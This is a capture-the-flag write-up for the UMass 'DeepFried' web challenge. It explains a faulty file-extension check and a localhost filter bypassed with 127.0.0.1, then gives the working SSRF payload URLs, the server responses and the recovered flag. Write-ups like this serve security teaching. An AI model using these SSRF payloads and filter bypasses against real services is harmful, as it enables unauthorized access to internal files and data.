# DeepFried [100 points]

### Description
```
Show off your class with this deep fried meme generator!

DeepFried.zip

Author: MrLarryMan#9564

http://deepfried.web.ctf.umasscybersec.org:3000
```

There is a `TheFlag.jpg` in `/restricted_memes`

However it can only be accessed locally

```js
router.all('/restricted_memes/:img', async (req,res, next)=>{
    if(req.ip === '::ffff:127.0.0.1') {
        next();
    } else {
       return res.status(403).send("Unauthorized Request");
    }
})
```

There are 2 ways to upload an image, we can directly upload the file or submit a link to the file, then it will get that image and store it in `/uploads/<random hex>/`

```js
    } else if(url) {
        if(!(path.extname(url) == '.jpg' || '.jpeg')) {
            return res.status(400).send("Invalid file type. Expected \".jpg\" or \".jpeg\"");
        } else if (url.includes('localhost')){
            return res.status(403).send("URL cannot reference localhost.");
        }
```

The link has to end with `.jpg` or `,jpeg` and not having `localhost` in it, we can bypass that with `127.0.0.1`

However this line is having a bug :
```js
        if(!(path.extname(url) == '.jpg' || '.jpeg')) {
```

it is just `'.jpeg'` after `||`, without `path.extname(url) ==`, so it's always true, it will allow all file extension

We can use that to do SSRF to get the flag image in `/restricted_memes/` to `/uploads/`

Submit this as the link :
```
http://127.0.0.1:3000/restricted_memes/TheFlag.jpg
```

Then it will response with a cookie of the location of the image inside `/uploads/`

```
HTTP/1.1 302 Found
X-Powered-By: Express
Set-Cookie: dff906eaec1a4eb3ecd775fb528c20f7/TheFlag.jpg
Location: captionsubmit
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 70
Date: Sun, 26 Mar 2023 05:38:47 GMT
Connection: close

<p>Found. Redirecting to <a href="captionsubmit">captionsubmit</a></p>
```

Then immediately read it in `/uploads/` before it gets deleted
http://deepfried.web.ctf.umasscybersec.org:3000/uploads/dff906eaec1a4eb3ecd775fb528c20f7/TheFlag.jpg

![](https://i.imgur.com/c0DPruk.png)

This image shows that the actual flag is in flag.txt, so just do this one more time with flag.txt

```
http://127.0.0.1:3000/restricted_memes/flag.txt
```

```
HTTP/1.1 302 Found
X-Powered-By: Express
Set-Cookie: 50b1d77a159b144035fe7fe8df30aa2b/flag.txt
Location: captionsubmit
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 70
Date: Sun, 26 Mar 2023 05:41:52 GMT
Connection: close

<p>Found. Redirecting to <a href="captionsubmit">captionsubmit</a></p>
```

http://deepfried.web.ctf.umasscybersec.org:3000/uploads/50b1d77a159b144035fe7fe8df30aa2b/flag.txt

```
UMASS{v@Mo$_APr0nTaR_1!i!I!}
```